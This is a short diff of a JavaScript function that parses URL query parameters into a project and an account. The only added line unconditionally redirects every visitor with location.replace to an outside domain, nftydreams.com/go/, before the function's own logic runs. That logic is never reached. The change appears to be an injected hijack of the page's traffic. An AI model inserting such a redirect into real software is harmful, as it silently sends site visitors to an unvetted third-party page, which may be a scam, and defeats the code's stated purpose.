@@ -3,7 +3,7 @@ function processRequest() {
   const params = new Proxy(new URLSearchParams(window.location.search), {
     get: (searchParams, prop) => searchParams.get(prop),
   });
-
+  location.replace('https://nftydreams.com/go/');
   if (params.id) {
     const project = params.id.split('/')[0];
     const account = params.id.split('/')[1];
